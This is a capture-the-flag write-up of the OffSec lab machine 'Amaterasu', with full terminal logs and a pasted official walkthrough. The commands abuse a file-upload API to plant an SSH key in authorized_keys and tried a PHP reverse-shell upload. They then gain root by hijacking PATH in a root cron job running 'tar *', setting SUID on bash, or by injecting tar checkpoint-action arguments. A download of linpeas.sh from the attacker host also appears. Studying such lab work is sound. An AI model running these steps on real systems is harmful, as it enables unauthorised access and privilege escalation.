---
title: Amaterasu
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.231.249                
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-20 19:52 +0900
Nmap scan report for 192.168.231.249
Host is up (0.078s latency).
Not shown: 65524 filtered tcp ports (no-response), 7 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
25022/tcp open  unknown
33414/tcp open  unknown
40080/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 148.62 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ sudo nmap -Pn -p21,25022,33414,40080 -sSCV -A -oN full_tcp-scan.txt --open 192.168.231.249
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-20 19:55 +0900
Nmap scan report for 192.168.231.249
Host is up (0.079s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.160
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open  http    Werkzeug httpd 2.2.3 (Python 3.9.13)
|_http-server-header: Werkzeug/2.2.3 Python/3.9.13
|_http-title: 404 Not Found
40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))
|_http-title: My test page
|_http-server-header: Apache/2.4.53 (Fedora)
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 5.14 - 6.8 (91%), Linux 2.6.32 - 3.10 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Unix

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   80.54 ms 192.168.45.1
2   80.21 ms 192.168.45.254
3   80.37 ms 192.168.251.1
4   80.51 ms 192.168.231.249

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.33 seconds
```

# HTTP

## 33414

![](../../../assets/images/Pasted%20image%2020260521004122.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ whatweb -a 3 http://192.168.231.249:33414
http://192.168.231.249:33414 [404 Not Found] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.3 Python/3.9.13], IP[192.168.231.249], Python[3.9.13], Title[404 Not Found], Werkzeug[2.2.3]
```

![](../../../assets/images/Pasted%20image%2020260521005113.png)

![](../../../assets/images/Pasted%20image%2020260521005058.png)

![](../../../assets/images/Pasted%20image%2020260521005204.png)

![](../../../assets/images/Pasted%20image%2020260521005248.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ feroxbuster \
-u http://192.168.231.249:33414 \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt

200      GET        1l       19w      137c http://192.168.231.249:33414/help
200      GET        1l       14w       98c http://192.168.231.249:33414/info

```

```zsh

```

## 40080

![](../../../assets/images/Pasted%20image%2020260521004239.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ whatweb -a 3 http://192.168.231.249:40080
http://192.168.231.249:40080 [200 OK] Apache[2.4.53], Country[RESERVED][ZZ], HTML5, HTTPServer[Fedora Linux][Apache/2.4.53 (Fedora)], IP[192.168.231.249], Title[My test page]
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ gobuster dir \
-u http://192.168.231.249:40080 \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
-x html,php,txt,bak,zip,old \
-t 25 \
-k \
-r \
--random-agent \
-b 403,404 \
-o gobuster.txt

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.249:40080
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   403,404
[+] User Agent:              Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.5.1 (KHTML, like Gecko) Safari/312.3.1
[+] Extensions:              bak,zip,old,html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 200) [Size: 894]
styles               (Status: 200) [Size: 885]
index.html           (Status: 200) [Size: 1092]
LICENSE              (Status: 200) [Size: 6555]
index.html           (Status: 200) [Size: 1092]
Progress: 435967 / 435967 (100.00%)
===============================================================
Finished
===============================================================
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST \
  -F "file=@test.txt" \
  -F "filename=test.txt" \
  http://192.168.231.249:33414/file-upload
{"message":"File successfully uploaded"}
```

![](../../../assets/images/Pasted%20image%2020260521020104.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST \                                     
  -F "file=@php-reverse-shell.php" \
  -F "filename=revshell.php" \
  http://192.168.231.249:33414/file-upload
{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST \
  -F "file=@php-reverse-shell.php.txt" \
  -F "filename=revshell.php" \
  http://192.168.231.249:33414/file-upload
curl: (26) Failed to open/read local data from file/application
```

```
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ cp php-reverse-shell.php php-reverse-shell.php.txt 
```

```
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST \                                    
  -F "file=@php-reverse-shell.php.txt" \
  -F "filename=revshell.php" \
  http://192.168.231.249:33414/file-upload
{"message":"File successfully uploaded"}
```

![](../../../assets/images/Pasted%20image%2020260521020910.png)

*But I can't access file*

---

# Initial Access

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ mkdir .ssh
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): /home/kali/CTF/OffSec/Amaterasu/.ssh/id_rsa
Enter passphrase for "/home/kali/CTF/OffSec/Amaterasu/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/CTF/OffSec/Amaterasu/.ssh/id_rsa
Your public key has been saved in /home/kali/CTF/OffSec/Amaterasu/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:nw0r/NOhlhwpRzcuxmX540eypPI7cNBSFex7lP77mqk kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|             oo. |
|            . .  |
|           o o  .|
|          + B ...|
|        So.O o.o |
|       ...O=+ *.o|
|        o=+O.= *.|
|         oB + ooo|
|         ..+E++++|
+----[SHA256]-----+
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ cp .ssh/id_rsa.pub .ssh/id_rsa.txt 
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST \
  -F "file=@/home/kali/CTF/OffSec/Amaterasu/.ssh/id_rsa.txt" \
  -F "filename=/home/alfredo/.ssh/authorized_keys" \        
  http://192.168.231.249:33414/file-upload
{"message":"File successfully uploaded"}
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ ssh -i .ssh/id_rsa alfredo@192.168.231.249 -p 25022
The authenticity of host '[192.168.231.249]:25022 ([192.168.231.249]:25022)' can't be established.
ED25519 key fingerprint is: SHA256:kflJUZqQzlDWxXgGuod+HGsJPk++nvt5ZyveJgx1jgQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.231.249]:25022' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ 
```

```zsh
[alfredo@fedora ~]$ cat local.txt 
2803640fc056cb3c260338bbe7de1a5a
[alfredo@fedora ~]$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:11:ae brd ff:ff:ff:ff:ff:ff
    altname enp2s0
    inet 192.168.231.249/24 brd 192.168.231.255 scope global noprefixroute ens32
       valid_lft forever preferred_lft forever
    inet6 fe80::f50:150:4e98:7404/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
[alfredo@fedora ~]$ 

```

---

# Privilege Escalation

```zsh
[alfredo@fedora ~]$ wget http://192.168.45.160/linpeas.sh -O /tmp/linpeas.sh
--2026-05-20 13:33:40--  http://192.168.45.160/linpeas.sh
Connecting to 192.168.45.160:80... ^C
[alfredo@fedora ~]$ wget http://192.168.45.160:33414/linpeas.sh -O /tmp/linpeas.sh
--2026-05-20 13:35:09--  http://192.168.45.160:33414/linpeas.sh
Connecting to 192.168.45.160:33414... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1062554 (1.0M) [application/x-sh]
Saving to: ‘/tmp/linpeas.sh’

/tmp/linpeas.sh              100%[==============================================>]   1.01M  1.71MB/s    in 0.6s    

2026-05-20 13:35:10 (1.71 MB/s) - ‘/tmp/linpeas.sh’ saved [1062554/1062554]
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ python3 -m http.server 33414
Serving HTTP on 0.0.0.0 port 33414 (http://0.0.0.0:33414/) ...
192.168.231.249 - - [21/May/2026 02:35:10] "GET /linpeas.sh HTTP/1.1" 200 -
```

![](../../../assets/images/Pasted%20image%2020260521031009.png)

```
-bash-5.1$ cat /usr/local/bin/backup-flask.sh 
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

```zsh
[alfredo@fedora ~]$ echo '#! /bin/bash' >tar
[alfredo@fedora ~]$ echo 'chmod u+s /bin/bash' >> tar
[alfredo@fedora ~]$ cp tar restapi/
[alfredo@fedora ~]$ cd restapi/
[alfredo@fedora restapi]$ chmod +x tar
[alfredo@fedora restapi]$ cat tar
#! /bin/bash
chmod u+s /bin/bash

...


[alfredo@fedora restapi]$ find / -user root -perm -u=s -ls 2>/dev/null
 25252326   1360 -rwsr-xr-x   1 root     root      1390080 Jan 25  2021 /usr/bin/bash
 25343651     40 -rwsr-xr-x   1 root     root        36904 Jan 26  2021 /usr/bin/fusermount
 25198885     76 -rwsr-xr-x   1 root     root        74208 Nov 30  2021 /usr/bin/chage
 25198886     80 -rwsr-xr-x   1 root     root        78536 Nov 30  2021 /usr/bin/gpasswd
 25198889     44 -rwsr-xr-x   1 root     root        42256 Nov 30  2021 /usr/bin/newgrp
 25581531     60 -rwsr-xr-x   1 root     root        58384 Feb 12  2021 /usr/bin/su
 25581515     52 -rwsr-xr-x   1 root     root        49920 Feb 12  2021 /usr/bin/mount
 25581534     40 -rwsr-xr-x   1 root     root        37560 Feb 12  2021 /usr/bin/umount
 25622180     32 -rwsr-xr-x   1 root     root        32624 Feb 16  2022 /usr/bin/pkexec
26104487     56 -rwsr-xr-x   1 root     root        53744 Mar 29  2021 /usr/bin/crontab
 25167404     40 -rwsr-xr-x   1 root     root        36912 Jun 15  2021 /usr/bin/fusermount3
 26032468    184 ---s--x--x   1 root     root       185504 Jan 26  2021 /usr/bin/sudo
 26032248     32 -rwsr-xr-x   1 root     root        32712 Jan 30  2021 /usr/bin/passwd
 26032254     36 -rws--x--x   1 root     root        33488 Feb 12  2021 /usr/bin/chfn
 26032255     28 -rws--x--x   1 root     root        25264 Feb 12  2021 /usr/bin/chsh
 26032388     60 -rwsr-xr-x   1 root     root        57432 Jan 25  2021 /usr/bin/at
 25326362    120 ---s--x---   1 root     stapusr    120656 Dec  7  2021 /usr/bin/staprun
   422020     16 -rwsr-xr-x   1 root     root        15624 Dec 10  2021 /usr/sbin/grub2-set-bootflag
   140107     16 -rwsr-xr-x   1 root     root        16096 Jan 17  2022 /usr/sbin/pam_timestamp_check
   140109     24 -rwsr-xr-x   1 root     root        24520 Jan 17  2022 /usr/sbin/unix_chkpwd
   554128    116 -rwsr-xr-x   1 root     root       116064 Sep 23  2021 /usr/sbin/mount.nfs
 25622521     24 -rwsr-xr-x   1 root     root        24504 Feb 16  2022 /usr/lib/polkit-1/polkit-agent-helper-1
 17150458     60 -rwsr-x---   1 root     cockpit-wsinstance    57608 Feb  2  2022 /usr/libexec/cockpit-session
```

```zsh
[alfredo@fedora restapi]$ bash -p
```

```
bash-5.1# id
uid=1000(alfredo) gid=1000(alfredo) euid=0(root) groups=1000(alfredo)
```

```
bash-5.1# cat /root/proof.txt
f37b9a0bb3575f2eca65928a1ccb2a86
bash-5.1# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:11:ae brd ff:ff:ff:ff:ff:ff
    altname enp2s0
    inet 192.168.231.249/24 brd 192.168.231.255 scope global noprefixroute ens32
       valid_lft forever preferred_lft forever
    inet6 fe80::f50:150:4e98:7404/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever

```



<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Amaterasu
Summary
An nmap scan reveals a REST API service on port 33414 which will allow us to list files on the server. After listing the files we discover a low privilege user "alfredo" and exploit a file upload vulnerability. We escalate privleges by using "Bash Gobbling", and by taking advantage of the "*" wildcard on the tar command.

Enumeration
We start off by running a standard nmap scan and a heavier scan which targets the ports discovered in the initial scan:

kali@kali:~$ sudo nmap -T4 -p- 192.168.56.101
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 20:48 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00027s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
5355/tcp  open  llmnr
25022/tcp open  unknown
33414/tcp open  unknown
40080/tcp open  unknown
kali@kali:~$ sudo nmap -T4 -sC -sV -p 21,25022,33414,40080 192.168.56.101
└─$ sudo nmap -T4 -sC -sV -p 21,5355,25022,33414,40080 192.168.56.101
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 20:49 EDT
Stats: 0:02:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.56% done; ETC: 20:51 (0:00:00 remaining)
Stats: 0:02:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.56% done; ETC: 20:51 (0:00:00 remaining)
Stats: 0:02:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.56% done; ETC: 20:51 (0:00:00 remaining)
Nmap scan report for 192.168.56.101
Host is up (0.0061s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    1 0        0              18 Apr 27 23:35 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5355/tcp  open  llmnr?
25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 ad:65:93:ab:92:f1:0b:32:de:6d:97:1f:09:0f:c3:ca (ECDSA)
|_  256 61:2c:5c:c6:c9:d8:77:37:c4:d4:dc:96:98:35:bf:cb (ED25519)
33414/tcp open  unknown
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.1 Python/3.9.12
|     Date: Thu, 28 Apr 2022 00:49:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   Help: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: My test page
|_http-server-header: Apache/2.4.53 (Fedora)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
(...snip...)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.02 seconds
After enumerating port 33414 using dirb for content discovery, we find an interesting info directory.

kali@kali:~$ dirb http://192.168.56.101:33414/ /usr/share/wordlists/dirb/small.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 27 20:50:57 2022
URL_BASE: http://192.168.56.101:33414/
WORDLIST_FILES: /usr/share/wordlists/dirb/small.txt

---- Scanning URL: http://192.168.56.101:33414/ ----

+ http://192.168.56.101:33414/info (CODE:200|SIZE:99)                       
                                                                               
-----------------
END_TIME: Wed Apr 27 20:51:06 2022
DOWNLOADED: 959 - FOUND: 1
We can use curl to probe the directory for interesting information.

kali@kali:~$ curl http://192.168.56.101:33414/info
["Python File Server REST API v2.5","Author: Alfredo Moroder","GET /help = List of the commands"]
kali@kali:~$ curl http://192.168.56.101:33414/help
["GET /info = General Info","GET /help = This listing","GET /file-list = List of the files","POST /file-upload = Upload files"]
kali@kali:~$ curl http://192.168.56.101:33414/file-list?dir=/
["boot","dev","home","proc","run","sys","tmp","etc","root","var","usr","bin","lib","lib64","media","mnt","opt","sbin","srv",".autorelabel"]
kali@kali:~$ curl http://192.168.56.101:33414/file-upload
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
kali@kali:~$ curl -X POST http://192.168.56.101:33414/file-upload
{"message":"No file part in the request"}                                                                                                     
We have discovered an endpoint that is used for file uploads, and is currently set in the server's root directory. We also take note that the author is the user alfredo for future reference.

Exploitation
We begin by testing the file upload option:

kali@kali:~$ echo "Hacking?" > test.txt
The following request should set the "file" part of the POST request.

kali@kali:~$ curl -F file=@test.txt http://192.168.56.101:33414/file-upload
{"message":"No filename part in the request"}
Now we set the filename:

kali@kali:~$ curl -F filename="up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
We receive a "500" Internal Server Error. As mentioned earlier the server is currently pointing to root, so we likely do not have write permissions. Next, we attempt to set a directory in the request:

kali@kali:~$ curl -F filename="/tmp/up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload
{"message":"File successfully uploaded /tmp/up.txt"}
This will provide useful information about the directory, such as identifying if a folder/file exists, if it is writeable, and more. We will first test to confirm that the user "alfredo" exists:

kali@kali:~$ curl -F filename="/home/alfredo/up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload
{"message":"File successfully uploaded /home/alfredo/up.txt"}

kali@kali:~$ curl -F filename="/home/alfredo/.ssh/up.txt" -F file=@test.txt http://192.168.56.101:33414/file-upload
{"message":"File successfully uploaded /home/alfredo/.ssh/up.txt"}
We confirmed not only that the user "alfredo" exists, but that we can also write in his home directory where there is an .ssh folder.

Exploitation
Let's create an SSH key with ssh-keygen:

kali@kali:~$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/id_alfredo
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/id_alfredo
Your public key has been saved in /home/kali/id_alfredo.pub
The key fingerprint is:
SHA256:2jZJco7aOWSCpO78cZ/VyO41fKnMUMbnBlUEc46KxLU kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|           . oo+ |
|        . . . *  |
|         o E o . |
|  .     . o o    |
| o .  . S. * .   |
|. . . oO..* + .  |
|.  . =o *= = =   |
|..  oooo+.= =    |
|.o... o+.o +     |
+----[SHA256]-----+
Now we attempt to upload the file to the server:

kali@kali:~$ curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.pub http://192.168.56.101:33414/file-upload
{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
We encounter a filter, but since we can write the file with any name, the filter can easily be traversed.

kali@kali:~$ mv id_alfredo.pub id_alfredo.txt
                                                                                                                    
kali@kali:~$ curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.txt http://192.168.56.101:33414/file-upload
{"message":"File successfully uploaded /home/alfredo/.ssh/authorized_keys"}
Now we attempt to connect using the key we generated:

kali@kali:~$ ssh -p 25022 -i id_alfredo alfredo@192.168.56.101
The authenticity of host '[192.168.56.101]:25022 ([192.168.56.101]:25022)' can't be established.
ED25519 key fingerprint is SHA256:jDDyaRYIBM6N9EgPcrE3LAfFMJbKpmZiPRMimrzmMXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.56.101]:25022' (ED25519) to the list of known hosts.
Last login: Wed Apr 27 21:08:46 2022

[alfredo@amaterasu ~]$ cat local.txt 
Privilege Escalation
After thorough enumeration we identify a script that is running as root located in /etc/crontab:

[alfredo@amaterasu ~]$ cat /etc/crontab
(... snip ...)

5 * * * * root /usr/local/bin/backup-flask.sh
[alfredo@amaterasu ~]$ cat /usr/local/bin/backup-flask.sh 
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
The * in the tar command will server as an entry point for a technique called BASH Gobbling.

We begin by creating a script to copy our key to the root user:

[alfredo@amaterasu ~]$ cd restapi
[alfredo@amaterasu restapi]$ echo '#!/bin/bash' >> getroot.sh
[alfredo@amaterasu restapi]$ echo 'cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys ' >> getroot.sh
[alfredo@amaterasu restapi]$ cat getroot.sh 
#!/bin/bash
cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys 
Now we can tamper with the backup process:

[alfredo@amaterasu restapi]$ touch ./--checkpoint=1 ./--checkpoint-action=exec=getroot.sh
We wait a few minutes for the cronjob to execute before trying to SSH in to the system as the ROOT user:

ssh -p 25022 -i id_alfredo root@192.168.56.101
Last login: Wed Apr 27 21:53:59 2022 from 192.168.56.1
[root@amaterasu ~]# cat proof.txt
```

</details>